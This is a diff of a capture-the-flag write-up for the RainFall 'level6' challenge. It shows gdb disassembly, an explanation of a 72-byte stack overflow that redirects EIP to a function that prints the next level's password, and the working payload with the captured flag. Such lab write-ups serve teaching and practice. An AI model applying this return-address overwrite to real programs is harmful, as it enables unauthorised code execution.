@@ -1,3 +1,5 @@
+# level6
+
 ```sh
 (gdb) info functions
 All defined functions:
@@ -74,8 +76,6 @@ Dump of assembler code for function n:
 End of assembler dump.
 ```
 
-this print "Nope"
-
 ```sh
 (gdb) disas m
 Dump of assembler code for function m:
@@ -89,52 +89,15 @@ Dump of assembler code for function m:
 End of assembler dump
 ```
 
-76 byte to stack
+this bin accept 1 argv
+
+we can see from disasembled code that n() call system("/bin/cat /home/user/level7/.pass");
+
+so using pattern generator we found the off set of 72
+
+then we add the address of n() to the end to let eip call n();
 
 ```sh
-(gdb) r `python -c "print 'A'* 76"`
-Starting program: /home/user/level6/level6 `python -c "print 'A'* 76"`
-
-Program received signal SIGSEGV, Segmentation fault.
-0x41414141 in ?? ()
-```
-
-
-```sh
-Starting program: /home/user/level6/level6 `python -c "print 'A'* 76"`
-
-Program received signal SIGSEGV, Segmentation fault.
-0x41414141 in ?? ()
-(gdb) r `python -c "print 'A'* 76"`
-The program being debugged has been started already.
-Start it from the beginning? (y or n) n
-Program not restarted.
-(gdb) p n
-$1 = {<text variable, no debug info>} 0x8048454 <n>
-(gdb) r `python -c "print 'A'* 76 + '\54\84\04\08'"`
-The program being debugged has been started already.
-Start it from the beginning? (y or n) r
-Please answer y or n.
-The program being debugged has been started already.
-Start it from the beginning? (y or n) y
-Starting program: /home/user/level6/level6 `python -c "print 'A'* 76 + '\54\84\04\08'"`
-
-Program received signal SIGSEGV, Segmentation fault.
-0x41414141 in ?? ()
-(gdb) step
-Cannot find bounds of current function
-(gdb) quit
-A debugging session is active.
-
-        Inferior 1 [process 17347] will be killed.
-
-Quit anyway? (y or n) y
-level6@RainFall:~$ ls
-level6
-level6@RainFall:~$ ./level6 `python -c "print 'A'* 76 + '\54\84\04\08'"`
-Segmentation fault (core dumped)
-level6@RainFall:~$ ./level6 `python -c "print 'A'* 72 + '\54\84\04\08'"`
-Segmentation fault (core dumped)
 level6@RainFall:~$ ./level6 `python -c "print 'A'* 72 + '\x54\x84\x04\x08'"`
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 level6@RainFall:~$ 
